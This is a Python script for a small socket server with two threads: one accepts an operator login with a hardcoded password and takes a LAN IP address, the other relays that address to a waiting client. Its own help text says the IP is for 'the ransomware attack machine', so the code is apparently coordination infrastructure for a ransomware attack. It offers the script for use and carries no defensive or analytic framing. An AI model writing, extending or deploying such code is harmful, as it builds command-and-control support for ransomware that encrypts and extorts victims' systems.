import threading
import socket
import time

lan_ip = None
banned_ips = []

BUFFER_SIZE = 512
OKAY_BYTES = b"\x03"
REQUEST_LAN_IP_BYTES = b"\x01"
ABOUT_TO_SEND_LAN_IP_BYTES = b"\x02"

def log_and_print(message):
    with open("log.txt", "a") as log_file:
        log_file.write(message + "\n")
    print(message)

def print_thread(msg):
    message = f"{threading.current_thread().name}: {msg}"
    log_and_print(message)

def bind_socket(port):
    s = socket.socket()
    print_thread(f"Binding on all IP addresses on port {port}...")
    s.bind(("0.0.0.0", port))
    s.listen(1)
    return s

def middle_handler():
    global lan_ip
    print_thread("Started. Listening on port 55037...")
    s = bind_socket(55037)

    conn, addr = s.accept()
    print_thread(f"Accepted connection from [{addr}]...")

    while True:
        conn.send(OKAY_BYTES)
        if conn.recv(BUFFER_SIZE) == REQUEST_LAN_IP_BYTES:
            print_thread("Received request for LAN IP address...")
            if lan_ip:
                print_thread("LAN IP address is set. Sending it then exiting...")
                conn.send(ABOUT_TO_SEND_LAN_IP_BYTES)
                conn.recv(BUFFER_SIZE)
                conn.send(lan_ip.encode())
                conn.recv(BUFFER_SIZE)
                break
            else:
                print_thread("LAN IP address not set yet. Continuing...")
                conn.send(b"")
        else:
            raise Exception("Invalid request")
        time.sleep(0.25)

    conn.close()
    s.close()
    print_thread("Ended.")

def login(conn):
    msg = conn.recv(BUFFER_SIZE)
    print_thread(f"Received login attempt: {msg}")
    return msg.strip() == b"joelwiscool"

def setter_handler():
    global banned_ips
    print_thread("Started. Listening on port 55036...")
    s = bind_socket(55036)

    while True:
        conn, addr = s.accept()
        print_thread(f"Accepted connection from [{addr}]...")

        if addr[0] not in banned_ips:
            handle_setter_session(conn, addr)
        else:
            print_thread(f"IP [{addr[0]}] is banned. Rejecting.")

        conn.close()

    s.close()

def handle_setter_session(conn, addr):
    attempts = 10
    while attempts > 0:
        if login(conn):
            handle_setter_commands(conn)
            return
        else:
            print_thread("Invalid login attempt. Waiting for login...")
            attempts -= 1

    banned_ips.append(addr[0])
    print_thread(f"Banned IP [{addr[0]}] for too many invalid login attempts.")

def handle_setter_commands(conn):
    global lan_ip
    PROMPT = "\n[type :help for help]-> "
    
    while True:
        conn.send(PROMPT.encode())
        msg = conn.recv(BUFFER_SIZE).decode().strip()
        
        if msg == ":exit":
            break
        elif msg == ":help":
            conn.send("type `:ip <lan_ip>` to specify the lan ip for the ransomware attack machine.\n".encode())
        elif msg.startswith(":ip"):
            lan_ip = msg[3:].strip()
            break

def main():
    mt = threading.Thread(target=middle_handler, name="MiddleHandler")
    st = threading.Thread(target=setter_handler, name="SetterHandler")

    mt.start()
    st.start()

    mt.join()
    st.join()

if __name__ == "__main__":
    main()